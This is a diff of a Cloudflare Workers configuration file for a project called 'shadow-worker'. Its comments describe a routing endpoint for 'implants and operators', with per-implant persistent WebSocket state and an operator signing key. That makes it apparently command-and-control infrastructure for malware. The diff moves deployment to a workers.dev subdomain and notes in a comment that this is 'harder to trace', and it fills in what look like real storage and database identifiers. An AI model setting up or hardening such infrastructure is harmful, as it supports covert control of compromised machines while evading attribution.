@@ -1,10 +1,11 @@
 name = "shadow-worker"
 main = "src/index.ts"
 compatibility_date = "2024-08-01"
+compatibility_flags = ["nodejs_compat"]
 
-# The routing endpoint for implants and operators
-# Configure via: wrangler.toml with your actual domain
-route = { pattern = "shadow.YOUR_DOMAIN.com/*", zone_name = "YOUR_DOMAIN.com" }
+# Deploy on the free workers.dev domain: shadow-worker.marwannaili-23-07.workers.dev
+# No custom domain needed — this is harder to trace and free.
+workers_dev = true
 
 # Durable Object bindings: one DO per implant for persistent WebSocket connection + SQLite state
 [[durable_objects.bindings]]
@@ -19,13 +20,13 @@ bucket_name = "shadow-storage"
 # KV Namespace for fleet-wide config and operator routing
 [[kv_namespaces]]
 binding = "FLEET_CONFIG"
-id = "YOUR_KV_ID"
+id = "643737e410d94be9b3df5211f74ae474"
 
 # D1 Database for audit logs and historical metrics
 [[d1_databases]]
 binding = "AUDIT_LOGS"
 database_name = "shadow-audit"
-database_id = "YOUR_D1_ID"
+database_id = "47b9a970-bf27-47e9-bd33-b01500120dea"
 
 # Migrations for Durable Objects SQLite
 [[migrations]]
@@ -33,7 +34,7 @@ tag = "v1"
 new_classes = ["ImplantDO"]
 
 [vars]
-# Injected via GitHub Secrets during CI
 # The Ed25519 public key of the Operator (hex encoded, 32 bytes = 64 hex chars)
+# Injected via GitHub Secrets during CI: OPERATOR_PUBKEY
 OPERATOR_PUBKEY = ""
 ENVIRONMENT = "production"
